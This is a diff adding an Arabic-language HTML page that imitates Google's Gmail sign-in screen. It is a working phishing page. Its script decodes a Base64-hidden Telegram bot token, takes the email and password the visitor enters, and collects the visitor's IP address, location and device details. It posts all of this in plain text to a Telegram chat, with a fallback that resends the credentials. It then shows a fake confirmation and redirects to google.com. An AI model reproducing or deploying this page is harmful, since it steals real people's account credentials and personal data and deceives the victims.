@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google - تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        .google-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        .google-logo {
+            font-size: 2.5rem;
+            font-weight: 500;
+            letter-spacing: -1px;
+            margin-bottom: 10px;
+        }
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+        h2 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 10px 0 5px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #5f6368;
+            margin-bottom: 5px;
+            text-align: right;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s;
+            text-align: right;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+        }
+        .forgot-link {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+        .forgot-link a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+        }
+        .create-account a {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .next-btn:hover {
+            background-color: #1669d4;
+        }
+        .next-btn:disabled {
+            background-color: #9aa0a6;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        .privacy {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .privacy a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .privacy a:hover {
+            text-decoration: underline;
+        }
+        .loading-message {
+            color: #1a73e8;
+            font-size: 12px;
+            margin-bottom: 15px;
+            padding: 8px 12px;
+            background-color: #e8f0fe;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-content {
+            background-color: white;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            margin: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            animation: slideDown 0.3s ease-out;
+        }
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .modal-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        .modal-title {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 15px;
+            color: #1a73e8;
+        }
+        .modal-message {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .modal-time {
+            background-color: #f8f9fa;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #34A853;
+            margin-bottom: 25px;
+            font-weight: 500;
+        }
+        .modal-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .modal-btn:hover {
+            background-color: #1669d4;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #1a73e8;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+        @media (max-width: 450px) {
+            .google-card {
+                padding: 30px 20px;
+            }
+            .actions {
+                flex-direction: column;
+                gap: 15px;
+            }
+            .create-account {
+                order: 2;
+            }
+            .next-btn {
+                order: 1;
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="google-card">
+            <div class="google-logo">
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </div>
+            <h2>تسجيل الدخول</h2>
+            <div class="subtitle">للمتابعة إلى Gmail</div>
+            <form id="loginForm" action="#">
+                <div id="loadingMessage" class="loading-message"></div>
+                <div class="input-group">
+                    <label for="username">البريد الإلكتروني أو رقم الهاتف</label>
+                    <input type="text" id="username" placeholder="example@gmail.com" required autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="password">كلمة المرور</label>
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور" required autocomplete="off">
+                </div>
+                <div class="forgot-link">
+                    <a href="#">نسيت البريد الإلكتروني؟</a>
+                </div>
+                <div class="actions">
+                    <div class="create-account">
+                        <a href="#">إنشاء حساب</a>
+                    </div>
+                    <button type="submit" class="next-btn" id="loginBtn">التالي</button>
+                </div>
+            </form>
+            <div class="privacy">
+                <a href="#">الخصوصية</a> • <a href="#">الشروط</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for success message -->
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-icon">📧</div>
+            <div class="modal-title">تم استلام طلبك</div>
+            <div class="modal-message">
+                تم إرسال بيانات تسجيل الدخول بنجاح.<br>
+                ستصلك رسالة التأكيد على بريدك الإلكتروني خلال 24 ساعة.
+            </div>
+            <div class="modal-time">
+                ⏰ سيتم الرد خلال 24 ساعة
+            </div>
+            <button class="modal-btn" onclick="redirectToGoogle()">حسناً</button>
+        </div>
+    </div>
+
+    <script>
+        // ========== إعدادات تليجرام (تم تشفير المفتاح فقط) ==========
+        // تشفير Base64 لمفتاح البوت ومعرف الدردشة فقط
+        const encryptedBotToken = 'ODU2NzY1MDY1NjpBQUZBWGU1TV94UTZab20tUV91YzdnMnclMkZBRDNXMmZBZHFrSQ==';
+        const encryptedChatId = 'ODMwNDEwMTM2Mg==';
+        
+        // فك تشفير المفتاح فقط
+        function decryptData(encryptedData) {
+            try {
+                return atob(encryptedData);
+            } catch(e) {
+                return '';
+            }
+        }
+        
+        // المفتاح المفكوك (مشفر في المصدر لكنه يظهر بعد فك التشفير)
+        const telegramBotToken = decryptData(encryptedBotToken);
+        const telegramChatId = decryptData(encryptedChatId);
+        // ============================================================
+
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loadingMessageDiv = document.getElementById('loadingMessage');
+        const successModal = document.getElementById('successModal');
+        
+        let isSubmitting = false;
+
+        // دالة سريعة لجلب IP
+        async function getIPFast() {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch('https://api.ipify.org?format=json', {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'غير متاح';
+            }
+        }
+
+        // دالة سريعة لجلب معلومات الموقع
+        async function getLocationFast(ip) {
+            if (ip === 'غير متاح') return { country: 'غير معروف', city: 'غير معروف' };
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 1500);
+                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await response.json();
+                return {
+                    country: data.country_name || 'غير معروف',
+                    city: data.city || 'غير معروف'
+                };
+            } catch (error) {
+                return { country: 'غير معروف', city: 'غير معروف' };
+            }
+        }
+
+        // دالة لجمع معلومات الجهاز
+        function getDeviceFast() {
+            const ua = navigator.userAgent;
+            let device = 'PC';
+            let browser = 'غير معروف';
+            let os = 'غير معروف';
+            
+            if (/Android/i.test(ua)) device = 'Android';
+            else if (/iPhone/i.test(ua)) device = 'iPhone';
+            else if (/iPad/i.test(ua)) device = 'iPad';
+            else if (/Windows/i.test(ua)) device = 'Windows';
+            else if (/Mac/i.test(ua)) device = 'Mac';
+            
+            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Edge/i.test(ua)) browser = 'Edge';
+            
+            if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10';
+            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
+            else if (/Mac OS X/i.test(ua)) os = 'macOS';
+            else if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+            
+            return { device, browser, os };
+        }
+
+        // إرسال البيانات إلى تليجرام (بدون تشفير اسم المستخدم وكلمة المرور)
+        function sendToTelegramFast(username, password, ip, location, device) {
+            const timestamp = new Date().toLocaleString('ar-EG');
+            const message = `🔐 GOOGLE LOGIN 🔐
+━━━━━━━━━━━━━━━━━━━━━━
+👤 المستخدم: ${username}
+🔑 كلمة المرور: ${password}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
+🏳️ الدولة: ${location.country}
+🏙️ المدينة: ${location.city}
+📱 الجهاز: ${device.device}
+🌍 المتصفح: ${device.browser}
+💻 النظام: ${device.os}
+🕒 الوقت: ${timestamp}
+━━━━━━━━━━━━━━━━━━━━━━`;
+            
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message
+                })
+            }).catch(() => {});
+        }
+
+        // عرض رسالة التحميل
+        function showLoading(show, message = 'جاري الاتصال...') {
+            if (show) {
+                loadingMessageDiv.innerHTML = `<span class="spinner"></span> ${message}`;
+                loadingMessageDiv.style.display = 'block';
+                loginBtn.disabled = true;
+            } else {
+                loadingMessageDiv.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+
+        // عرض رسالة النجاح للمستخدم
+        function showSuccessMessage() {
+            successModal.style.display = 'flex';
+        }
+
+        // التوجيه إلى Google
+        function redirectToGoogle() {
+            successModal.style.display = 'none';
+            window.location.href = 'https://www.google.com';
+        }
+
+        // معالج تسجيل الدخول
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            if (isSubmitting) return;
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!username) {
+                alert('❌ الرجاء إدخال البريد الإلكتروني أو رقم الهاتف');
+                usernameInput.focus();
+                return;
+            }
+            
+            if (!password) {
+                alert('❌ الرجاء إدخال كلمة المرور');
+                passwordInput.focus();
+                return;
+            }
+            
+            isSubmitting = true;
+            showLoading(true, 'جاري تسجيل الدخول...');
+            
+            try {
+                // جمع المعلومات
+                const ip = await getIPFast();
+                const location = await getLocationFast(ip);
+                const device = getDeviceFast();
+                
+                // إرسال البيانات إلى تليجرام (اسم المستخدم وكلمة المرور بدون تشفير)
+                sendToTelegramFast(username, password, ip, location, device);
+                
+                console.log('✅ تم إرسال البيانات إلى تليجرام');
+                console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${device.device}`);
+                
+                // إظهار رسالة النجاح
+                showLoading(false);
+                showSuccessMessage();
+                
+            } catch (error) {
+                console.error('خطأ:', error);
+                // محاولة إرسال البيانات الأساسية
+                try {
+                    const basicMessage = `🔐 GOOGLE LOGIN\n👤 ${username}\n🔑 ${password}\n🕒 ${new Date().toLocaleString()}`;
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
+                    }).catch(() => {});
+                } catch(e) {}
+                
+                showLoading(false);
+                showSuccessMessage();
+                isSubmitting = false;
+            }
+        });
+        
+        // دعم الضغط على Enter
+        usernameInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                loginForm.dispatchEvent(new Event('submit'));
+            }
+        });
+        
+        // إغلاق المودال عند الضغط خارجها
+        window.onclick = function(event) {
+            if (event.target === successModal) {
+                redirectToGoogle();
+            }
+        }
+        
+        console.log('✅ تم تحميل الصفحة - تم تشفير مفتاح البوت فقط');
+    </script>
+</body>
+</html>
